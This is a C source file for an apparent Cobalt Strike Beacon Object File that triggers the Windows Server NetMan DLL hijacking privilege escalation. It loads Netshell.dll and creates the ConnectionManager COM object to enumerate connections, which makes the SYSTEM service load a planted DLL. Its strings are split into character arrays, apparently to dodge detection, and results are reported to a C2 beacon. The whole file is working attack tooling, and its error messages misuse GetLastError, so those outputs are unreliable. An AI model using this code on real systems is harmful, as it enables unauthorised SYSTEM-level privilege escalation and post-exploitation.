/* https://itm4n.github.io/windows-server-netman-dll-hijacking/ */
#include <initguid.h>
#include <windows.h>
#include <netcon.h>
#include <stdio.h>

#include "beacon.h"

/* https://github.com/reactos/reactos/blob/master/sdk/lib/uuid/otherguids.c */
DEFINE_GUID(IID_INetConnectionManager,       0xC08956A2,0x1CD3,0x11D1,0xB1,0xC5,0x00,0x80,0x5F,0xC1,0x27,0x0E);
DEFINE_GUID(CLSID_ConnectionManager,         0xBA126AD1,0x2166,0x11D1,0xB1,0xD0,0x00,0x80,0x5F,0xC1,0x27,0x0E);

DECLSPEC_IMPORT HRESULT WINAPI  OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT HRESULT WINAPI  OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID *);
DECLSPEC_IMPORT void WINAPI     OLE32$CoUninitialize();

void trigger() {

    INetConnectionManager * p_NetConnectionManager =    NULL;
    IEnumNetConnection * p_EnumConnection =             NULL;
    INetConnection * p_Connection =                     NULL;
    NETCON_PROPERTIES * p_ConnectionProperties =        NULL;

    const char s_NetShell[] =               { 'N', 'e', 't', 's', 'h', 'e', 'l', 'l', '.', 'd', 'l', 'l', 0 };
    const char s_NcFreeNetconProperties[] = { 'N', 'c', 'F', 'r', 'e', 'e', 'N', 'e', 't', 'c', 'o', 'n', 'P', 'r', 'o', 'p', 'e', 'r', 't', 'i', 'e', 's', 0 };

    ULONG count;
    HRESULT h_res;
    HMODULE h_NetShell;
    FARPROC NcFreeNetconProperties;

    h_NetShell = LoadLibrary(s_NetShell);

    if (h_NetShell == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "LoadLibrary failed with error %d\n", GetLastError);
        return;
    }

    NcFreeNetconProperties = GetProcAddress(h_NetShell, s_NcFreeNetconProperties);

    if (NcFreeNetconProperties == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "GetProcAddress failed with error %d\n", GetLastError);
        return;
    }

    /* Initialize the COM */
    h_res =  OLE32$CoInitializeEx(0, COINIT_MULTITHREADED);

    if (FAILED(h_res)) {
        BeaconPrintf(CALLBACK_OUTPUT, "CoInitializeEx failed with error %d\n", h_res);
        return;
    }

    /* Create COM Instance of NetConnectionManager */
    h_res = OLE32$CoCreateInstance(&CLSID_ConnectionManager, NULL, CLSCTX_ALL, &IID_INetConnectionManager, (void **)&p_NetConnectionManager);

    if (FAILED(h_res)) {
        BeaconPrintf(CALLBACK_OUTPUT, "CoCreateInstance failed with error %d\n", h_res);
        OLE32$CoUninitialize();
        return;
    }

    h_res = p_NetConnectionManager->lpVtbl->EnumConnections(p_NetConnectionManager, NCME_DEFAULT, &p_EnumConnection);

    if (FAILED(h_res)) {
        BeaconPrintf(CALLBACK_OUTPUT, "EnumConnections failed with error %d\n", h_res);
        OLE32$CoUninitialize();
        return;
    }

    /* Loop through the connections */
    while(p_EnumConnection->lpVtbl->Next(p_EnumConnection, 1, &p_Connection, &count) == S_OK) { 

        /* Get the properties of the connection */
        h_res = p_Connection->lpVtbl->GetProperties(p_Connection, &p_ConnectionProperties);
        
        if(SUCCEEDED(h_res)) {
            BeaconPrintf(CALLBACK_OUTPUT, "Interface: %ls\n", p_ConnectionProperties->pszwName);
            NcFreeNetconProperties(p_ConnectionProperties);
        }
        p_Connection->lpVtbl->Release(p_Connection);
    }

    p_EnumConnection->lpVtbl->Release(p_EnumConnection);
    p_NetConnectionManager->lpVtbl->Release(p_NetConnectionManager);
    OLE32$CoUninitialize();
    FreeLibrary(h_NetShell);
}

void go(char * args, int argLen) {
    trigger();
}
